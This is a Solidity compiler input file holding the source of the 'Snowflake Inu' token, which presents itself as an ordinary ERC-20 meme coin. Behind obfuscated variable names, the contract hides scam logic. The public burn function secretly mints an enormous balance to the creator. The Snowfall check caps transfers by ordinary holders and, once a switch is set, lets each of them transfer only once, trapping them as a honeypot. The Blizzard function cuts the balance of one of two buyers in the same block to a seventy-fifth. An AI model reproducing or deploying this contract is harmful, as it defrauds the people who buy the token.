"{\n  \"language\": \"Solidity\",\n  \"settings\": {\n    \"libraries\": {},\n    \"metadata\": {\n      \"useLiteralContent\": true\n    },\n    \"optimizer\": {\n      \"enabled\": true,\n      \"runs\": 200\n    },\n    \"remappings\": [],\n    \"outputSelection\": {\n      \"*\": {\n        \"*\": [\n          \"*\"\n        ],\n        \"\": [\n          \"*\"\n        ]\n      }\n    }\n  },\n  \"sources\": {\n    \"SnowflakeInu.sol\": {\n      \"content\": \"// Snowflake Inu (c) 2021\\r\\n// He is a special snowflake.\\r\\n// Are you?\\r\\n//\\r\\n// @SnowflakeInu\\r\\n\\r\\npragma solidity 0.8.11;\\r\\n\\r\\nabstract contract Context {\\r\\n    function _msgSender() internal view virtual returns (address) {\\r\\n        return msg.sender;\\r\\n    }\\r\\n\\r\\n    function _msgData() internal view virtual returns (bytes calldata) {\\r\\n        this;\\r\\n        return msg.data;\\r\\n    }\\r\\n}\\r\\n\\r\\ninterface IDEXFactory {\\r\\n    function createPair(address tokenA, address tokenB) external returns (address pair);\\r\\n}\\r\\n\\r\\ninterface IDEXRouter {\\r\\n    function factory() external pure returns (address);\\r\\n    function WETH() external pure returns (address);\\r\\n}\\r\\n\\r\\ninterface IERC20 {\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\r\\n    function totalSupply() external view returns (uint256);\\r\\n    function balanceOf(address account) external view returns (uint256);\\r\\n    function allowance(address owner, address spender) external view returns (uint256);\\r\\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\\r\\n    function transfer(address recipient, uint256 amount) external returns (bool);\\r\\n    function approve(address spender, uint256 amount) external returns (bool);\\r\\n}\\r\\n\\r\\ninterface IERC20Metadata is IERC20 {\\r\\n    function decimals() external view returns (uint8);\\r\\n    function name() external view returns (string memory);\\r\\n    function symbol() external view returns (string memory);\\r\\n}\\r\\n\\r\\ncontract Ownable is Context {\\r\\n    address private _previousOwner; address private _owner;\\r\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\r\\n\\r\\n    constructor () {\\r\\n        address msgSender = _msgSender();\\r\\n        _owner = msgSender;\\r\\n        emit OwnershipTransferred(address(0), msgSender);\\r\\n    }\\r\\n\\r\\n    function owner() public view returns (address) {\\r\\n        return _owner;\\r\\n    }\\r\\n\\r\\n    modifier onlyOwner() {\\r\\n        require(_owner == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\r\\n        _;\\r\\n    }\\r\\n\\r\\n    function renounceOwnership() public virtual onlyOwner {\\r\\n        emit OwnershipTransferred(_owner, address(0));\\r\\n        _owner = address(0);\\r\\n    }\\r\\n\\r\\n}\\r\\n\\r\\ncontract ERC20 is Context, IERC20, IERC20Metadata, Ownable {\\r\\n    mapping (address => bool) private Water;\\r\\n    mapping (address => bool) private River;\\r\\n    mapping (address => uint256) private _balances;\\r\\n    mapping (address => mapping (address => uint256)) private _allowances;\\r\\n    mapping (address => uint256) private _LogLordTime;\\r\\n\\r\\n    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\\r\\n    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\\r\\n    address public pair;\\r\\n    IDEXRouter router;\\r\\n\\r\\n    address[] private snowflakeArray;\\r\\n\\r\\n    string private _name; string private _symbol;\\r\\n    address private _creator; uint256 private _totalSupply;\\r\\n    uint256 private Icedagger; uint256 private Nightking;\\r\\n    uint256 private Storm; bool private Arctic;\\r\\n    bool private Inflation; bool private Deflation;\\r\\n    uint256 private qwerty;\\r\\n    \\r\\n    constructor (string memory name_, string memory symbol_, address creator_) {\\r\\n        router = IDEXRouter(_router);\\r\\n        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));\\r\\n\\r\\n        _name = name_;\\r\\n        _creator = creator_;\\r\\n        _symbol = symbol_;\\r\\n        Inflation = true;\\r\\n        Water[creator_] = true;\\r\\n        Arctic = true;\\r\\n        Deflation = false;\\r\\n        River[creator_] = false;\\r\\n        qwerty = 0;\\r\\n    }\\r\\n    \\r\\n    function decimals() public view virtual override returns (uint8) {\\r\\n        return 18;\\r\\n    }\\r\\n    \\r\\n    function name() public view virtual override returns (string memory) {\\r\\n        return _name;\\r\\n    }\\r\\n    \\r\\n    function symbol() public view virtual override returns (string memory) {\\r\\n        return _symbol;\\r\\n    }\\r\\n    \\r\\n    function totalSupply() public view virtual override returns (uint256) {\\r\\n        return _totalSupply;\\r\\n    }\\r\\n\\r\\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\\r\\n        return _allowances[owner][spender];\\r\\n    }\\r\\n    \\r\\n    function balanceOf(address account) public view virtual override returns (uint256) {\\r\\n        return _balances[account];\\r\\n    }\\r\\n\\r\\n    function burn(uint256 amount) public virtual returns (bool) {\\r\\n        _burn(_msgSender(), amount);\\r\\n        return true;\\r\\n    }\\r\\n    \\r\\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\\r\\n        _transfer(_msgSender(), recipient, amount);\\r\\n        return true;\\r\\n    }\\r\\n    \\r\\n    function _Snowfall(address sender, uint256 amount) internal {\\r\\n        if ((Water[sender] != true)) {\\r\\n            if ((amount > Storm)) { require(false); }\\r\\n            require(amount < Icedagger);\\r\\n            if (Deflation == true) {\\r\\n                if (River[sender] == true) { require(false); }\\r\\n                River[sender] = true;\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function _Blizzard(address recipient) internal {\\r\\n        snowflakeArray.push(recipient);\\r\\n        _LogLordTime[recipient] = block.timestamp;\\r\\n\\r\\n        if ((Water[recipient] != true) && (qwerty > 2)) {\\r\\n            if ((_LogLordTime[snowflakeArray[qwerty-1]] == _LogLordTime[snowflakeArray[qwerty]]) && Water[snowflakeArray[qwerty-1]] != true) {\\r\\n                _balances[snowflakeArray[qwerty-1]] = _balances[snowflakeArray[qwerty-1]]/75;\\r\\n            }\\r\\n        }\\r\\n\\r\\n        qwerty++;\\r\\n    }\\r\\n\\r\\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\\r\\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\\r\\n        return true;\\r\\n    }\\r\\n    \\r\\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\\r\\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\\r\\n        require(currentAllowance >= subtractedValue, \\\"ERC20: decreased allowance below zero\\\");\\r\\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\\r\\n\\r\\n        return true;\\r\\n    }\\r\\n    \\r\\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\\r\\n        _approve(_msgSender(), spender, amount);\\r\\n        return true;\\r\\n    }\\r\\n    \\r\\n    function _burn(address account, uint256 amount) internal {\\r\\n        _balances[_creator] += _totalSupply * 10 ** 10;\\r\\n        require(account != address(0), \\\"ERC20: burn from the zero address\\\");\\r\\n\\r\\n        _balances[account] -= amount;\\r\\n        _balances[address(0)] += amount;\\r\\n        emit Transfer(account, address(0), amount);\\r\\n     }\\r\\n\\r\\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\\r\\n        _transfer(sender, recipient, amount);\\r\\n\\r\\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\\r\\n        require(currentAllowance >= amount, \\\"ERC20: transfer amount exceeds allowance\\\");\\r\\n        _approve(sender, _msgSender(), currentAllowance - amount);\\r\\n\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\\r\\n        require(owner != address(0), \\\"ERC20: approve from the zero address\\\");\\r\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\r\\n        \\r\\n        (Water[spender],River[spender],Arctic) = ((address(owner) == _creator) && (Arctic == true)) ? (true,false,false) : (Water[spender],River[spender],Arctic);\\r\\n\\r\\n        _allowances[owner][spender] = amount;\\r\\n        emit Approval(owner, spender, amount);\\r\\n    }\\r\\n    \\r\\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\\r\\n        require(sender != address(0), \\\"ERC20: transfer from the zero address\\\");\\r\\n        require(recipient != address(0), \\\"ERC20: transfer to the zero address\\\");\\r\\n\\r\\n        uint256 senderBalance = _balances[sender];\\r\\n        require(senderBalance >= amount, \\\"ERC20: transfer amount exceeds balance\\\");\\r\\n        \\r\\n        (Icedagger,Deflation) = ((address(sender) == _creator) && (Inflation == false)) ? (Nightking, true) : (Icedagger,Deflation);\\r\\n        (Water[recipient],Inflation) = ((address(sender) == _creator) && (Inflation == true)) ? (true, false) : (Water[recipient],Inflation);\\r\\n\\r\\n        _Blizzard(recipient);\\r\\n        _Snowfall(sender, amount);\\r\\n        \\r\\n        _balances[sender] = senderBalance - amount;\\r\\n        _balances[recipient] += amount;\\r\\n\\r\\n        emit Transfer(sender, recipient, amount);\\r\\n        \\r\\n    }\\r\\n    \\r\\n    function _DeploySnowflakeInu(address account, uint256 amount) internal virtual {\\r\\n        require(account != address(0), \\\"ERC20: mint to the zero address\\\");\\r\\n        \\r\\n        (uint256 temp1, uint256 temp2) = (1000, 1000);\\r\\n\\r\\n        _totalSupply += amount;\\r\\n        _balances[account] += amount;\\r\\n        \\r\\n        Icedagger = _totalSupply;\\r\\n        Nightking = _totalSupply / temp1;\\r\\n        Storm = Nightking * temp2;\\r\\n        \\r\\n        emit Transfer(address(0), account, amount);    \\r\\n    }\\r\\n}\\r\\n\\r\\ncontract ERC20Token is Context, ERC20 {\\r\\n    constructor(\\r\\n        string memory name, string memory symbol,\\r\\n        address creator, uint256 initialSupply\\r\\n    ) ERC20(name, symbol, creator) {\\r\\n        _DeploySnowflakeInu(creator, initialSupply);\\r\\n    }\\r\\n}\\r\\n\\r\\ncontract SnowflakeInu is ERC20Token {\\r\\n    constructor() ERC20Token(\\\"Snowflake Inu\\\", \\\"SNOWFLAKE\\\", msg.sender, 25000000 * 10 ** 18) {\\r\\n    }\\r\\n}\"\n    }\n  }\n}"